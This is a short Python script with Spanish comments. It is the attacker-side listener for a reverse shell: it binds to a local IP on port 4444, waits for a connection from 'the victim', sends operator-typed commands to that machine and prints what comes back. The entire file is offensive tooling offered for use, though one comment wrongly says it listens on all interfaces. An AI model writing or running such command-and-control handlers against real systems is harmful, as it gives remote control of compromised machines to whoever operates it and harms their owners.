import socket

# Definimos la dirección IP y el puerto del servidor de escucha
HOST = '192.168.103.93'  # Escucha en todas las interfaces
PORT = 4444       # Puerto de escucha

# Creamos un socket para la conexión
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Enlazamos el socket al puerto y comenzamos a escuchar conexiones
s.bind((HOST, PORT))
s.listen(1)

print(f"[*] Escuchando en {HOST}:{PORT}")

# Aceptamos la conexión entrante
conn, addr = s.accept()
print(f"[+] Conexión entrante desde: {addr[0]}:{addr[1]}")

# Interacción con el usuario
while True:
    command = input("Shell> ")
    
    # Enviamos el comando a la víctima
    conn.send(command.encode())
    
    # Si el comando es "exit", cerramos la conexión
    if command.strip() == "exit":
        break
    
    # Recibimos y mostramos la salida del comando ejecutado por la víctima
    output = conn.recv(1024).decode()
    print(output)

# Cerramos la conexión
conn.close()
